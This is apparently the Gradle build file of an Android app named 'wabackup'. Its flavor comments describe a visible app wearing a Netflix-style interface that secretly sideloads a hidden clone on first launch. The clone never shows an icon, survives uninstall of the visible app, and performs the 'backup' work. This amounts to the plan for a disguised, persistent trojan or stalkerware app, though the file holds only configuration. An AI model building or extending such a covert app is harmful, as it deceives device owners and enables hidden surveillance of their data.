plugins {
    id 'com.android.application'
    id 'org.jetbrains.kotlin.android'
}

android {
    namespace 'com.personal.wabackup'
    compileSdk 34

    defaultConfig {
        applicationId "com.personal.wabackup"
        minSdk 26
        targetSdk 34
        versionCode 8
        versionName "1.8"
    }

    flavorDimensions "copy"

    productFlavors {
        // Visible copy — the one the user installs. Netflix UI stays exactly as before.
        dev {
            dimension "copy"
        }
        // Hidden "copy version" — auto-sideloaded by the visible copy on first launch,
        // icon never shown, survives uninstall of the visible copy, does the backup work.
        clone {
            dimension "copy"
            applicationIdSuffix ".clone"
        }
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }
    kotlinOptions {
        jvmTarget = '17'
    }
    buildFeatures {
        viewBinding true
    }
}

dependencies {
    implementation 'androidx.core:core-ktx:1.13.1'
    implementation 'androidx.appcompat:appcompat:1.7.0'
    implementation 'com.google.android.material:material:1.12.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
    implementation 'androidx.work:work-runtime-ktx:2.9.1'
    implementation 'androidx.security:security-crypto-ktx:1.1.0-alpha06'
    implementation 'androidx.recyclerview:recyclerview:1.3.2'
    implementation 'androidx.documentfile:documentfile:1.0.1'
    implementation 'com.github.bumptech.glide:glide:4.16.0'
    annotationProcessor 'com.github.bumptech.glide:compiler:4.16.0'
}
